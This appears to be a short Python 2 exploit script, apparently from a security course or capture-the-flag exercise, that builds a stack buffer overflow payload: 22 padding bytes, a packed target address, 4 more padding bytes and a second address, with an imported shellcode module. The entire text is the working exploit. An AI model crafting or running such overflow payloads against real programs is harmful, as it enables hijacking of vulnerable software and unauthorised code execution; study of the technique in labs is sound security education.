from struct import pack
from shellcode import shellcode

print "a"*22+pack("<I",0x0804a030)+"a"*4+pack("<I",0x080c61e5)
